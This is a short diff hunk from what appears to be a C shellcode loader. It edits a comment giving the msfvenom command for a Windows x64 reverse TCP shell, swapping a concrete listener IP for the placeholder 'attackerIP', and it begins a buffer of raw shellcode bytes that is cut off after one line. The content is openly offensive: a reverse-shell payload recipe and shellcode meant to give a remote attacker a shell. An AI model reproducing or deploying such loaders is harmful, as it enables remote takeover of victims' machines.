@@ -36,7 +36,7 @@ int main()
 	  
 	Sleep(100);
 
-	//shell code: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.255.14 LPORT=8080 -f c
+	//shell code: msfvenom -p windows/x64/shell_reverse_tcp LHOST=attackerIP LPORT=Port -f c
 	char buff[] = 
 	{
 		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
